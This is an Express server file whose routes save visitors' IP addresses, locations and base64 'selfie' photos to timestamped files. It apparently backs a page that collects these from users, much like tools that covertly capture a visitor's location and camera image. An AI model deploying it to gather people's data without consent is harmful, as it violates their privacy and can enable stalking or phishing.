const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const bodyParser = require('body-parser');
const PORT = process.env.PORT || 3001;
const cors = require('cors');


app.use(cors());

app.use(express.static(path.join(__dirname, 'build')));

app.use(express.json());

app.use(bodyParser.json({ limit: '100mb' }));

// Route to handle saving IP address to a text file
app.post('/saveip', (req, res) => {
    const { ip } = req.body;
    // Save IP address to a text file
    const timestamp = new Date().toISOString().replace(/:/g, '-').replace(/\..+/, '');
    // Construct filename with timestamp
    const filename = `ip_addresses_${timestamp}.txt`;
    // Define the directory to save files
    const dataDir = path.join(__dirname, '/data');


    fs.writeFile(path.join(dataDir, filename), ip + '\n', (err) => {
        if (err) {
            console.error('Error saving IP address:', err);
            res.status(500).send('Error saving IP address');
        } else {
            console.log('IP address saved successfully:', ip);
            res.send('IP address saved successfully');
        }
    });
});



app.post('/saveLocation', (req, res) => {
    const location = req.body;
    console.log('Received location:', location);
    // Save IP address to a text file
    const timestamp = new Date().toISOString().replace(/:/g, '-').replace(/\..+/, '');
    // Construct filename with timestamp
    const filename = `location_${timestamp}.txt`;
    // Define the directory to save files
    const dataDir = path.join(__dirname, '/data');


    fs.writeFile(path.join(dataDir,filename), location + '\n', (err) => {
        if (err) {
            console.error('Error saving IP address:', err);
            res.status(500).send('Error saving IP address');
        } else {
            console.log('IP address saved successfully:', location);
            res.send('IP address saved successfully');
        }
    });
});



app.post('/savepic', (req, res) => {
    const { photo } = req.body;
    
    // Remove data prefix and convert to buffer
    const photoData = Buffer.from(photo.replace(/^data:image\/\w+;base64,/, ''), 'base64');
    
    // Save photo to data/photos directory with a timestamp as filename
    const timestamp = new Date().toISOString().replace(/:/g, '-').replace(/\..+/, '');
    const filename = `selfie_${timestamp}.png`;
    const filePath = path.join(__dirname, '/data', filename);

    fs.writeFile(filePath, photoData, 'base64', (err) => {
        if (err) {
            console.error('Error saving selfie:', err);
            res.status(500).send('Error saving selfie');
        } else {
            console.log('Selfie saved successfully:', filename);
            res.send('Selfie saved successfully');
        }
    });
});



// Serve index.html when root URL is accessed
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.use(express.static('public'));

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
